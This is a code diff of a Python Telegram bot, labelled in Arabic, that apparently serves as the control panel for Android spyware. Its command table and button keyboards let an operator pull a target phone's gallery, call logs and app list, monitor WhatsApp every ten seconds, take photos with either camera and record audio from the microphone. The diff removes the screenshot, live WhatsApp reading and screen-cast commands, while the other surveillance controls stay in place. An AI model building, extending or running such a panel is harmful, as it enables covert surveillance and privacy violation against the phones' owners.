@@ -242,7 +242,7 @@ COMMANDS = {
     "gallery":        {"category": "data",   "label": "🖼 المعرض",            "description": "سحب صور المعرض",          "needs_param": False},
     # ⚠️ gmail تمت إزالته — يحتاج Notification Access
     # ⚠️ whatsapp-messages تمت إزالته — يحتاج Notification Access
-    "whatsapp-live":     {"category": "data", "label": "💬 واتساب مباشر",  "description": "قراءة واتساب من الشاشة (بدون إذن إشعارات)", "needs_param": False},
+    # whatsapp-live تمت إزالته
     "whatsapp-monitor-on":  {"category": "data", "label": "🟢 بدء مراقبة الواتساب", "description": "مراقبة ذكية كل 10 ثوانٍ + بصمة MD5", "needs_param": False},
     "whatsapp-monitor-off": {"category": "data", "label": "⏹ إيقاف مراقبة الواتساب", "description": "إيقاف مراقبة واتساب", "needs_param": False},
     # ⚠️ telegram-messages تمت إزالته — يحتاج Notification Access
@@ -250,8 +250,7 @@ COMMANDS = {
     # camera
     "main-camera":    {"category": "camera", "label": "📷 كاميرا رئيسية",    "description": "تصوير بالكاميرا الخلفية",  "needs_param": False},
     "selfie-camera":  {"category": "camera", "label": "🤳 كاميرا سيلفي",     "description": "تصوير بالكاميرا الأمامية", "needs_param": False},
-    "screenshot":     {"category": "camera", "label": "📸 لقطة شاشة",        "description": "التقاط صورة حقيقية من الشاشة", "needs_param": False},
-    # screenshot تمت إزالته من المشروع
+    # screenshot تمت إزالته
     # audio
     "microphone":     {"category": "audio",  "label": "🎤 تسجيل صوتي",      "description": "تسجيل من الميكروفون (اكتب المدة بالثواني)",     "needs_param": True, "param_hint": "10 أو 60 أو 120 (ثانية)"},
     "playAudio":      {"category": "audio",  "label": "🔊 تشغيل صوت",       "description": "تشغيل ملف صوتي",          "needs_param": True, "param_hint": "رابط الصوت"},
@@ -299,26 +298,7 @@ def build_command_payload(cmd_type, params=None):
                 else:
                     p["params"] = {"value": str(params)}
             return p
-        # ⚡ request-screen-permission (MediaProjection)
-        if cmd_type == "request-screen-permission":
-            p = {"command": cmd_type, "category": "permissions",
-                 "timestamp": datetime.now(timezone.utc).isoformat()}
-            return p
-        # ⚡ request-notification-permission (NotificationListenerService)
-        if cmd_type == "request-notification-permission":
-            p = {"command": cmd_type, "category": "permissions",
-                 "timestamp": datetime.now(timezone.utc).isoformat()}
-            return p
-        # ⚡ start-screen-cast (بدء البث المباشر)
-        if cmd_type == "start-screen-cast":
-            p = {"command": cmd_type, "category": "permissions",
-                 "timestamp": datetime.now(timezone.utc).isoformat()}
-            return p
-        # ⚡ stop-screen-cast (إيقاف البث المباشر)
-        if cmd_type == "stop-screen-cast":
-            p = {"command": cmd_type, "category": "permissions",
-                 "timestamp": datetime.now(timezone.utc).isoformat()}
-            return p
+        # ⚡ screen-permission, screen-cast, notification-permission تمت إزالتها
         return None
     p = {"command": cmd_type, "category": cmd["category"],
          "timestamp": datetime.now(timezone.utc).isoformat()}
@@ -454,7 +434,7 @@ def data_keyboard(did):
     kb.add(_cbtn(did,"calls"), _cbtn(did,"apps"))
     kb.add(_cbtn(did,"gallery"))
     # ⚠️ gmail تمت إزالته
-    kb.add(_cbtn(did,"whatsapp-live"))
+    # whatsapp-live تمت إزالته
     kb.add(_cbtn(did,"whatsapp-monitor-on"))
     kb.add(_cbtn(did,"whatsapp-monitor-off"))
     # ⚠️ telegram-messages تمت إزالته
@@ -466,8 +446,6 @@ def data_keyboard(did):
 def camera_keyboard(did):
     kb = InlineKeyboardMarkup(row_width=2)
     kb.add(_cbtn(did,"main-camera"), _cbtn(did,"selfie-camera"))
-    # ⚡ زر لقطة شاشة (MediaProjection)
-    kb.add(_cbtn(did,"screenshot"))
     kb.add(_back(did))
     return kb
 
@@ -520,22 +498,7 @@ def permissions_keyboard(did):
            perm_btn("calls", "📞 المكالمات"))
     kb.add(perm_btn("notifications", "🔔 الإشعارات"),
            perm_btn("phone-state", "📱 حالة الهاتف"))
-    # ⚡ زر البث المباشر — يختلف حسب حالة البث
-    is_casting = dm.is_screen_casting(did)
-    cache_key3 = str(len(_file_path_cache))
-    if is_casting:
-        _file_path_cache[cache_key3] = "stop-screen-cast"
-        cast_btn = InlineKeyboardButton(
-            "⏹ إيقاف البث المباشر",
-            callback_data=f"cmd:{did}:p{cache_key3}"[:64]
-        )
-    else:
-        _file_path_cache[cache_key3] = "start-screen-cast"
-        cast_btn = InlineKeyboardButton(
-            "📺 البث المباشر",
-            callback_data=f"cmd:{did}:p{cache_key3}"[:64]
-        )
-    kb.add(cast_btn)
+    # ⚡ البث المباشر تمت إزالته
     kb.add(_back(did))
     return kb
 
